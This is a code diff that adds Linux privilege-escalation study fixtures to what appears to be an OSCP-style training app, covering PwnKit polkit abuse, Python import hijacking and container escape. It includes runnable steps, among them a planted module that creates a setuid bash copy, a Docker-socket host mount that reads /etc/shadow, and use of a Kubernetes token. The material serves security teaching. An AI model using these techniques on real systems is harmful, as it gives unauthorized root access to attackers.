@@ -6002,4 +6002,294 @@
   };
   Object.keys(GAPFILL5F).forEach(function (k) { OBOL.STUDY_FIXTURES[k] = GAPFILL5F[k]; });
 
+  // --- Phase-G gap-fill: container + local-service radar (beyond OSCP) ---
+  var GAPFILL5G = {
+    "polkit-abuse": {
+      "why": "polkit (PolicyKit) is the service that decides whether an unprivileged process may run a privileged action over D-Bus, and pkexec is its setuid helper. Two things make it a reliable root: pkexec carried a memory-corruption bug (PwnKit, CVE-2021-4034) that gave instant root on almost every Linux box for a decade, and separately, policy misconfigurations or the CVE-2021-3560 race let you call privileged D-Bus actions (create a user, install a package) you should not be allowed to. The tell is simply that pkexec exists and the box is not patched, or that a D-Bus service exposes an action with a permissive policy. Check the pkexec version first; it is often the fastest root on the box.",
+      "cmd": "ls -l /usr/bin/pkexec && pkexec --version",
+      "tool": "sh",
+      "output": "-rwsr-xr-x 1 root root 31032 /usr/bin/pkexec\npkexec version 0.105",
+      "signal": "pkexec version 0.105",
+      "teach": "pkexec is setuid-root and the version is old enough to be PwnKit-vulnerable (CVE-2021-4034). A public exploit gives instant root; if patched, look instead for a D-Bus action with a permissive policy you can call.",
+      "leadup": [
+        {
+          "key": "pkexec",
+          "label": "pkexec is present and setuid",
+          "steps": [
+            {
+              "title": "Confirm the setuid helper",
+              "tool": "sh",
+              "where": "target",
+              "cmd": "ls -l /usr/bin/pkexec",
+              "out": "-rwsr-xr-x 1 root root 31032 /usr/bin/pkexec",
+              "sig": "rwsr",
+              "teach": "The s in the permission bits means pkexec runs as root; that is what PwnKit abuses."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "polkit abuse is check the pkexec version for PwnKit, and separately look for a D-Bus action with a loose policy.",
+        "items": [
+          {
+            "t": "Check the pkexec version",
+            "d": "Versions before the 2022 fix are PwnKit-vulnerable. The version alone tells you whether the instant-root path is open.",
+            "demo": [
+              {
+                "run": "pkexec --version",
+                "out": "pkexec version 0.105",
+                "sig": "pkexec version 0.105"
+              }
+            ],
+            "note": "0.105 and most earlier builds are vulnerable unless the distro backported the patch."
+          },
+          {
+            "t": "Run the PwnKit exploit",
+            "d": "A public CVE-2021-4034 PoC compiles on the box and drops a root shell by abusing pkexec's argument handling.",
+            "demo": [
+              {
+                "run": "gcc cve-2021-4034.c -o pwn && ./pwn",
+                "out": "# id\nuid=0(root) gid=0(root)",
+                "sig": "uid=0(root)"
+              }
+            ],
+            "note": "Prefer a precompiled binary if the box has no compiler; keep a copy staged."
+          },
+          {
+            "t": "Or abuse a D-Bus policy",
+            "d": "Where pkexec is patched, enumerate D-Bus services for an action whose policy lets your context call it, such as creating a user.",
+            "demo": [
+              {
+                "run": "busctl list | grep -i accounts",
+                "out": "org.freedesktop.Accounts  1234 accounts-daemon root",
+                "sig": "org.freedesktop.Accounts"
+              }
+            ],
+            "note": "CVE-2021-3560 raced this exact daemon to create a privileged user."
+          },
+          {
+            "t": "Confirm root",
+            "d": "The shell or the new privileged account is your root; capture proof.",
+            "demo": [
+              {
+                "run": "id",
+                "out": "uid=0(root) gid=0(root) groups=0(root)",
+                "sig": "uid=0(root)"
+              }
+            ],
+            "note": "Clean up any user you created afterward."
+          }
+        ]
+      },
+      "situation": "An unprivileged shell on Linux, and pkexec is setuid-root at version 0.105. What is the fastest move?",
+      "choices": [
+        "polkit-abuse",
+        "linux-kernel-exploit",
+        "suid-gtfobins",
+        "sudo-abuse"
+      ],
+      "coach": {
+        "linux-kernel-exploit": "A kernel exploit is riskier; PwnKit against this pkexec is a reliable, local, instant root.",
+        "suid-gtfobins": "pkexec is setuid but not a GTFOBins shell-out; its bug (PwnKit) is the lever here.",
+        "sudo-abuse": "No sudo right is in play; pkexec's own vulnerability is the path."
+      }
+    },
+    "python-library-hijack": {
+      "why": "When root runs a Python script and any directory on that script's module search path is writable by you, you can plant a module the script imports and your code runs as root. Python searches the script's own directory first, then PYTHONPATH, then the site-packages dirs, so a writable script directory, a writable entry on PYTHONPATH, or a world-writable site-packages all give you the hijack. The same idea covers a writable .pth file and a shadowing module that out-ranks the real one on the path. The tell is a root cron or sudo-run Python script whose directory, or an importable path it uses, you can write.",
+      "cmd": "python3 -c 'import sys; print(sys.path)'",
+      "tool": "sh",
+      "output": "['/opt/app', '/usr/lib/python3.11', '/usr/lib/python3/dist-packages']",
+      "signal": "/opt/app",
+      "teach": "The first entry on the path is the script's own directory, /opt/app. If that directory (or any writable entry) is yours, plant a module the root script imports and it runs as root on the next run.",
+      "leadup": [
+        {
+          "key": "script",
+          "label": "Root runs a Python script",
+          "steps": [
+            {
+              "title": "Find the root Python job",
+              "tool": "sh",
+              "where": "target",
+              "cmd": "cat /etc/crontab; sudo -l 2>/dev/null | grep -i '\\.py'",
+              "out": "*/5 * * * * root /usr/bin/python3 /opt/app/collect.py",
+              "sig": "/opt/app/collect.py",
+              "teach": "A root cron or sudo entry running a Python script is the thing whose imports you want to hijack."
+            }
+          ]
+        },
+        {
+          "key": "writable",
+          "label": "A path entry is writable",
+          "steps": [
+            {
+              "title": "Check the script directory",
+              "tool": "sh",
+              "where": "target",
+              "cmd": "ls -ld /opt/app",
+              "out": "drwxrwxr-x 2 root staff 4096 /opt/app",
+              "sig": "drwxrwxr-x",
+              "teach": "If your group can write the script's directory, you can plant a module it imports before the real one."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Python library hijack is find the root script, find a writable entry on its import path, and plant a module it imports.",
+        "items": [
+          {
+            "t": "Find the root script and its imports",
+            "d": "Read the script to see which modules it imports; a local import (not a stdlib one) is the easiest to shadow.",
+            "demo": [
+              {
+                "run": "head -5 /opt/app/collect.py",
+                "out": "import config\nimport requests",
+                "sig": "import config"
+              }
+            ],
+            "note": "config is a local module, so a config.py you plant on the path wins."
+          },
+          {
+            "t": "Confirm a writable path entry",
+            "d": "The script's own directory is first on sys.path; a writable one lets you shadow any import. PYTHONPATH and site-packages are the alternatives.",
+            "demo": [
+              {
+                "run": "ls -ld /opt/app && python3 -c 'import sys;print(sys.path[0])'",
+                "out": "drwxrwxr-x 2 root staff 4096 /opt/app\n/opt/app",
+                "sig": "/opt/app"
+              }
+            ],
+            "note": "A writable .pth file in site-packages is another route onto the path."
+          },
+          {
+            "t": "Plant the hijack module",
+            "d": "Write a module with the imported name whose top-level code runs your payload; it executes when the root script imports it.",
+            "demo": [
+              {
+                "run": "echo 'import os; os.system(\"cp /bin/bash /tmp/rb; chmod +s /tmp/rb\")' > /opt/app/config.py",
+                "out": "",
+                "sig": ""
+              }
+            ],
+            "note": "Keep the module importable (no syntax errors) so the script does not crash before your code runs."
+          },
+          {
+            "t": "Wait for the run and confirm",
+            "d": "On the next execution the root script imports your module and runs your payload as root.",
+            "demo": [
+              {
+                "run": "/tmp/rb -p -c id",
+                "out": "uid=0(root) gid=0(root)",
+                "sig": "uid=0(root)"
+              }
+            ],
+            "note": "A SUID bash copy is root on demand."
+          }
+        ]
+      },
+      "situation": "A root cron runs /opt/app/collect.py, and your group can write /opt/app. What is the move?",
+      "choices": [
+        "python-library-hijack",
+        "cron-abuse",
+        "linux-path-hijack",
+        "suid-gtfobins"
+      ],
+      "coach": {
+        "cron-abuse": "The cron script itself is not writable; the weakness is a module it imports from a directory you can write.",
+        "linux-path-hijack": "That hijacks a PATH binary call; here you hijack a Python import on sys.path.",
+        "suid-gtfobins": "No abusable SUID binary is in play; the lever is the writable import path of a root script."
+      }
+    },
+    "container-escape": {
+      "why": "Landing in a container is not the objective; the host is. Several common misconfigurations hand you the node: a container run with --privileged (or CAP_SYS_ADMIN) can mount the host disk or abuse cgroups to run a command in the host namespace; a mounted Docker socket lets you start a new container that bind-mounts the host root; and in Kubernetes a pod's mounted service-account token, if its role is permissive, lets you create a privileged pod or exec on another. The tell is a token file under /var/run/secrets, a docker.sock in the mounts, or a capability set that should never be in a container. Enumerate what the container was given, because that is the escape.",
+      "cmd": "cat /proc/1/cgroup; ls -la /var/run/secrets/kubernetes.io/serviceaccount 2>/dev/null; ls -l /var/run/docker.sock 2>/dev/null",
+      "tool": "sh",
+      "output": "0::/docker/5f3a...\ntotal 0\n-rw-r--r-- 1 root root  ca.crt\n-rw-r--r-- 1 root root  token",
+      "signal": "root  token",
+      "teach": "A cgroup path with docker confirms you are containerized, and a mounted Kubernetes service-account token is present. Read the token's permissions; a permissive role lets you create a privileged pod or exec onto the node.",
+      "leadup": [
+        {
+          "key": "inside",
+          "label": "You are inside a container",
+          "steps": [
+            {
+              "title": "Confirm containerization",
+              "tool": "sh",
+              "where": "target",
+              "cmd": "cat /proc/1/cgroup; ls -la /.dockerenv 2>/dev/null",
+              "out": "0::/docker/5f3a9c...\n-rwxr-xr-x 1 root root 0 /.dockerenv",
+              "sig": "/docker/",
+              "teach": "A docker cgroup or a /.dockerenv file means you are in a container, so the goal is escaping to the host."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Container escape is enumerate what the container was given (privilege, socket, token), then use that to reach the node.",
+        "items": [
+          {
+            "t": "Check for privileged mode and capabilities",
+            "d": "A privileged container, or one with CAP_SYS_ADMIN, can mount the host disk or abuse cgroups to run on the host.",
+            "demo": [
+              {
+                "run": "capsh --print | grep -i sys_admin; cat /proc/self/status | grep CapEff",
+                "out": "CapEff: 000001ffffffffff",
+                "sig": "000001ffffffffff"
+              }
+            ],
+            "note": "A full CapEff mask (that value) is effectively a privileged container."
+          },
+          {
+            "t": "Abuse a mounted Docker socket",
+            "d": "If docker.sock is mounted, start a new container that bind-mounts the host root and chroot into it.",
+            "demo": [
+              {
+                "run": "docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh",
+                "out": "# cat /host/etc/shadow | head -1\nroot:$6$...",
+                "sig": "root:$6$"
+              }
+            ],
+            "note": "The socket is root on the host by design; mounting / is game over."
+          },
+          {
+            "t": "Abuse a Kubernetes service-account token",
+            "d": "A mounted token with a permissive role lets you talk to the API and create a privileged pod or exec onto a node.",
+            "demo": [
+              {
+                "run": "kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) auth can-i create pods",
+                "out": "yes",
+                "sig": "yes"
+              }
+            ],
+            "note": "can-i create pods (or exec) is the escalation; schedule a pod that mounts the host filesystem."
+          },
+          {
+            "t": "Reach the node and confirm",
+            "d": "A privileged pod mounting the host root, or a disk mount, gives you the node filesystem and from there root.",
+            "demo": [
+              {
+                "run": "chroot /host id",
+                "out": "uid=0(root) gid=0(root)",
+                "sig": "uid=0(root)"
+              }
+            ],
+            "note": "Host root from a container is the escape; capture proof on the node."
+          }
+        ]
+      },
+      "situation": "You have a shell inside a container, and /var/run/secrets holds a Kubernetes service-account token. What is the move?",
+      "choices": [
+        "container-escape",
+        "linux-enum",
+        "linux-kernel-exploit",
+        "docker-socket"
+      ],
+      "coach": {
+        "linux-enum": "Standard enumeration helps, but the container-specific levers (token, socket, privilege) are the escape here.",
+        "linux-kernel-exploit": "A kernel bug is a fallback; the mounted token is a cleaner, intended-path escape to the node.",
+        "docker-socket": "That is the right idea when a docker.sock is mounted; here the lever is the Kubernetes token, so query the API."
+      }
+    }
+  };
+  Object.keys(GAPFILL5G).forEach(function (k) { OBOL.STUDY_FIXTURES[k] = GAPFILL5G[k]; });
+
 })(typeof globalThis !== 'undefined' ? globalThis : this);
